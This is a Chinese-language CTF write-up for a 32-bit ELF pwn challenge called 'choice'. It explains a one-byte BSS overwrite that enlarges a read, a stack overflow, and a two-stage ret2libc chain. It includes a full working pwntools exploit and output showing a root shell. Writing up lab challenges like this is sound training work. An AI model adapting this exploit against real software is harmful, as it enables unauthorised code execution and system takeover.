# CTF Writeup — choice（PWN 方向）

**特长方向：** 二进制漏洞利用（PWN）  
**提交邮箱：** yinxzy@126.com  
**备注：** 网安赛校内选拔，特长 PWN

---

## 一、题目信息

题目名称为 choice，方向为 PWN（二进制漏洞利用）。给出一个 ELF 可执行文件，目标是利用程序中的漏洞获取目标系统的 Shell。

---

## 二、文件分析

### 2.1 基本信息

用 `file` 命令查看文件类型：

```
$ file choice
choice: ELF 32-bit LSB executable, Intel 80386, dynamically linked, stripped
```

用 `checksec` 查看保护机制：

```
$ checksec --file=choice
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

关键结论：
- 32 位程序
- 无 PIE，所有代码段和 PLT/GOT 地址固定
- NX 开启，栈不可执行，不能直接注入 shellcode
- 无栈 Canary，可以随意覆盖返回地址

### 2.2 逆向分析

使用 Ghidra 和 objdump 反汇编程序，梳理程序逻辑如下：

程序启动后打印欢迎语，提示输入名字，然后展示三个选项的菜单，要求用户选择。

**名字读取（BSS 段）：**

```
read(0, 0x804a04c, 21)
```

BSS 段布局：name_buf 起始地址为 0x804a04c，占 20 字节；紧跟其后的 0x804a060 存放变量 size_var，初始值为 21。两者相距恰好 20 字节，因此 read 读入的第 21 字节会直接覆盖 size_var 的低字节。这是第一个漏洞。

**菜单选项处理：**

选项 1 或 2（错误答案）时，main 函数调用子函数 0x804857b。该子函数先打印 "Cool! And whd did you choice it?"，然后用 size_var 作为长度从标准输入读取内容到栈上缓冲区，最后打印 "Good bye!" 并返回。这是第二个漏洞所在。

选项 3（正确答案）时，读取操作在 main 函数内执行，但 main 的函数尾声含有 ECX 恢复栈指针的技巧（`lea -0x4(%ecx), %esp; ret`），直接溢出会导致崩溃，利用复杂。

---

## 三、漏洞分析

### 漏洞 1：BSS 段越界写

`read(0, name_buf, 21)` 允许读入 21 字节，而 name_buf 只有 20 字节。第 21 字节会写到紧邻的 size_var 处，将其改为我们指定的值。

发送 `b'A' * 20 + b'\xff'` 后，size_var 从 21 变为 255。

### 漏洞 2：栈缓冲区溢出

子函数 0x804857b 的关键汇编：

```asm
804857e:  sub  $0x28, %esp        ; 分配 40 字节栈空间
804859a:  lea  -0x1c(%ebp), %eax  ; buffer 地址 = ebp - 28
80485a0:  call read               ; read(0, ebp-28, size_var)
80485b9:  leave                   ; 标准 epilogue
80485ba:  ret                     ; 直接弹出返回地址，无任何保护
```

栈布局（从 buffer 起点计算偏移）：

- 偏移 0 ~ 27：栈缓冲区，共 28 字节
- 偏移 28 ~ 31：saved EBP，4 字节
- 偏移 32 ~ 35：返回地址，4 字节 ← 控制这里即可劫持 EIP

size_var 被改为 255，read 最多读 255 字节，而我们只需要 36 字节就能覆盖返回地址。填充 32 字节垃圾数据后，紧跟的 4 字节即为新返回地址。

---

## 四、漏洞利用思路

由于 NX 开启，栈不可执行，不能注入 shellcode，采用 ret2libc 技术。

ret2libc 思路：通过覆盖返回地址，让程序跳转到 libc 中已有的函数（puts、system 等），利用这些函数完成攻击。

整体分两轮进行：

**第一轮：泄露 libc 地址**

覆盖返回地址为 `puts@plt`，参数为 `puts@got`。puts 会打印 GOT 表中 puts 的运行时地址（4 字节），从而得知 libc 被加载到了哪个基址。之后返回 main 重新运行。

计算方式：`libc_base = puts_real_addr - puts在libc中的偏移`

**第二轮：getshell**

已知 libc_base 后，计算 system 和 /bin/sh 的真实地址。再次溢出，覆盖返回地址为 `system`，参数为 `/bin/sh` 字符串地址，执行后获得 Shell。

### 为什么选选项 1 而非选项 3？

这是本题的关键坑点。选项 3 的读取在 main 函数内部完成，main 函数的尾声代码如下：

```asm
804876c:  mov  -0x4(%ebp), %ecx  ; 从栈上恢复 ECX
804876f:  leave
8048770:  lea  -0x4(%ecx), %esp  ; 用 ECX 重新设置 ESP（绕过了正常的栈恢复）
8048773:  ret                    ; 此时 ESP 已被 ECX 污染，崩溃
```

溢出后 ECX 被我们的填充数据破坏，导致 ESP 指向随机地址，ret 无法正常执行。

子函数 0x804857b 的尾声只有标准的 `leave; ret`，不含 ECX 技巧，溢出后可以干净地弹出我们放置的返回地址，ROP 链可靠执行。因此必须选选项 1 触发这条路径。

---

## 五、完整 Exploit 代码

```python
#!/usr/bin/env python3
# choice PWN — ret2libc exploit
from pwn import *
context.log_level = 'info'

ELF_PATH  = './choice'
LIBC_PATH = '/lib/i386-linux-gnu/libc.so.6'

elf  = ELF(ELF_PATH,  checksec=False)
libc = ELF(LIBC_PATH, checksec=False)

# 固定地址（无 PIE）
PUTS_PLT  = elf.plt['puts']    # 0x08048430
PUTS_GOT  = elf.got['puts']    # 0x0804a01c
MAIN_ADDR = 0x080485bb

# libc 偏移
PUTS_OFF   = libc.symbols['puts']
SYSTEM_OFF = libc.symbols['system']
BINSH_OFF  = next(libc.search(b'/bin/sh'))

# padding = buffer(28字节) + saved_EBP(4字节) = 32字节
PADDING = b'A' * 32

def send_name_and_wrong_choice(io):
    io.recvuntil(b'Please enter your name:')
    io.send(b'A' * 20 + b'\xff')       # 第21字节覆盖 size_var → 255
    io.recvuntil(b'Study hard from now\n')
    io.send(b'1')                       # 选1 → 进入子函数（标准 leave;ret）
    io.recvuntil(b'Cool! And whd did you choice it?\n')

def exploit(io):
    # 第一轮：泄露 puts 运行时地址
    send_name_and_wrong_choice(io)
    payload1 = PADDING + p32(PUTS_PLT) + p32(MAIN_ADDR) + p32(PUTS_GOT)
    io.send(payload1)
    io.recvuntil(b'Good bye!\n')        # 子函数打印完后 ret 执行 ROP
    leaked = io.recv(4)
    puts_real = u32(leaked)
    log.success(f'puts  @ {hex(puts_real)}')

    libc_base   = puts_real - PUTS_OFF
    system_addr = libc_base + SYSTEM_OFF
    binsh_addr  = libc_base + BINSH_OFF
    log.success(f'libc  @ {hex(libc_base)}')
    log.success(f'system@ {hex(system_addr)}')

    # 第二轮：getshell
    send_name_and_wrong_choice(io)
    payload2 = PADDING + p32(system_addr) + b'JUNK' + p32(binsh_addr)
    io.send(payload2)
    io.recvuntil(b'Good bye!\n')

    log.success('Shell 获取成功！')
    io.interactive()

if __name__ == '__main__':
    io = process(ELF_PATH)
    exploit(io)
```

---

## 六、运行结果

```
$ python3 exp.py
[+] Starting local process './choice': pid 30588
[+] puts  @ 0xf7d22140
[+] libc  @ 0xf7caa000
[+] system@ 0xf7cfa430
[+] Shell 获取成功！
[*] Switching to interactive mode

$ id
uid=0(root) gid=0(root) groups=0(root)

$ whoami
root

$ uname -a
Linux vm 6.18.5 #2 SMP x86_64 GNU/Linux
```

成功泄露 libc 基址并执行 system("/bin/sh")，获得 root Shell。

---

## 七、总结

本题考查点如下：

第一，BSS 段越界写。利用 name 输入的边界问题，用一个字节覆盖相邻变量 size_var，将后续 read 的读取上限从 21 扩大到 255，为栈溢出创造条件。

第二，栈缓冲区溢出。在 size_var 被篡改后，向栈上缓冲区写入超长数据，覆盖返回地址，劫持程序控制流。

第三，ret2libc。NX 保护禁止执行栈上代码，通过调用 libc 中已有的 puts 函数泄露其运行时地址，计算 libc 基址，再调用 system("/bin/sh") 获取 Shell。

第四，函数 epilogue 分析。识别 main 函数中非标准的 ECX 恢复栈指针机制，选择标准 leave;ret 的子函数路径绕过该问题，保证 ROP 链正常执行。

---

*使用工具：pwntools、Ghidra、objdump、GDB+pwndbg、checksec、patchelf*
